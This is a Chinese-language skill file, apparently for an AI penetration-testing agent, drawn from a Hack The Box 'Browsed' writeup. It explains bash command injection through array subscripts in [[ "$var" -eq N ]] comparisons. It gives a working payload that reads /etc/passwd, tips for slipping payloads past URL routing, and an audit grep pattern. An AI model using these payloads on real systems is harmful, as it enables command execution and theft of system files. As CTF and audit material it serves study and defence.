---
name: 'bash-array-subscript-injection'
description: 'bash [[ -eq ]] 数组下标命令注入：x[$(cmd)] 形式（Browsed writeup 确认，裸 $( ) 不触发）'
disable-model-invocation: true
metadata: { domain: web, tier: T3 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# bash  -eq  数组下标注入（x[$(cmd)] 形式）

## 技术（Browsed HTB writeup 确认）
```bash
# 漏洞代码: routines.sh
if  "$1" -eq 0 ; then ...
```
` "$1" -eq 0 ` 中 `-eq` 强制算术求值。**payload 形式**：
```
$ ./routines.sh 'x[$(cat /etc/passwd > /proc/$$/fd/1)]'   # ← 命令执行！
```
- `x[...]` 解析为**数组 x 的下标** → 下标是算术表达式 → `$( )` 在算术求值中**执行**
- 报错 "expression recursion level exceeded" 但命令**已执行**
- **裸 `$(cmd)` / `0$(cmd)` 不执行**（arithmetic syntax error）——必须 `x[$(cmd)]` 形式

## 利用要点
- URL 传参时 `/` 会被 Flask 路由吃掉（404）→ payload 用 base64 或 python -c（无 /）
- 输出可用 `> /proc/$$/fd/1` 回显到脚本 stdout
- 验证方法: `x[$(touch /tmp/test)]` → 检查文件（注意 cwd）

## 场景
- 任何 ` "$var" -eq N ` 且 var 可控的 bash 脚本（subprocess.run 无 shell 也能注入！）
- 本地脚本审计: grep -E '\[\[ .* -eq ' *.sh

**Why:** Browsed 靶机复盘最大收获——我们测了 $( ) 和 0$( ) 都判"无注入"，漏了 x[...] 形式（writeup 的 "bash edge case"）。
**How to apply:** 审计 bash 脚本发现 ` "$x" -eq N ` 且 x 可控 → 直接试 `x[$(cmd)]` payload，不要只试裸 $( )。
